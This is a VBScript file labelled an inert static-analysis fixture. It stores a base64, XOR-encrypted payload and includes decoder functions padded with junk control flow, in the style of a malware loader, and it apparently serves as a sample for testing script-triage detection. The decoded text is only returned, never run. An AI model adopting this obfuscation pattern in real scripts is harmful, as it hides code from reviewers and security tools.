Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_b510ba4c = "8f982r3zpz3V8+utLse64p0hya3mrmHWvOKyLNSr2LY/x6D0pCjU4vKyIcmv450/w6Potijar+OjPdKr9f8Ow7zzkCjX4OK6KNq986Mqw5HkrTjIurrwMcWv6rIsz6npnSTC8+SjINav7qUji/ni9H/E+LHwepGy8rAhm6bztj3V9KjtesP4taB7kPyw9WPDtuavPcqrqasj0K/rqymJ/uOkfcT5tvBjwq/zvjjVq/WdLMGr6bZw7rvptj/DvfSOLMThsKd7lKyx9H+R+fukJMqr2LIs0qa6gXf6m/SnP9WS17cvyqfkngXToPOwKNW9y6Mv+r3zoyrD47Cne5SssfR/kfmppizSsvKyIcmv45041KK6qjnSvvT4Yon54vR/xPix8HqR4OK6LMu+66djz6DxoyHPqqi3Pcqh5qZinve0+iie9rM="
Const Codec_b510ba4c = "base64_chunks|repeating_key_xor|87,c2,4d,a6,ce"

Function Base64_b510ba4c(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_b510ba4c", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_b510ba4c = outputBytes
End Function

Function Load_b510ba4c()
  Dim partWidth, packedText
  partWidth = (Len(Material_b510ba4c) + 3) \ 4
  packedText = Mid(Material_b510ba4c, 1, partWidth) & Mid(Material_b510ba4c, partWidth + 1, partWidth) & Mid(Material_b510ba4c, partWidth * 2 + 1, partWidth) & Mid(Material_b510ba4c, partWidth * 3 + 1)
  Load_b510ba4c = Base64_b510ba4c(packedText)
End Function

Function Decode_b510ba4c(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  keyBytes = Array(135,194,77,166,206)
  For materialIndex = 0 To UBound(storedMaterial)
    result(materialIndex) = storedMaterial(materialIndex) Xor keyBytes(materialIndex Mod 5)
  Next
  Decode_b510ba4c = result
End Function

Function Recover_b510ba4c()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  If True Then
    If (2 > 1) Then harmlessValue = "left" Else harmlessValue = "right"
      storedMaterial = Load_b510ba4c()
      Do
        recoveredMaterial = Decode_b510ba4c(storedMaterial)
        Exit Do
      Loop
      configurationText = ""
      For materialIndex = 0 To UBound(recoveredMaterial)
        configurationText = configurationText & Chr(recoveredMaterial(materialIndex))
      Next
  End If
  Recover_b510ba4c = configurationText
End Function

Sub Copy_b510ba4c(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_b510ba4c()
  Dim resultText
  Call Copy_b510ba4c(Recover_b510ba4c(), resultText)
  Inspect_b510ba4c = resultText
End Function
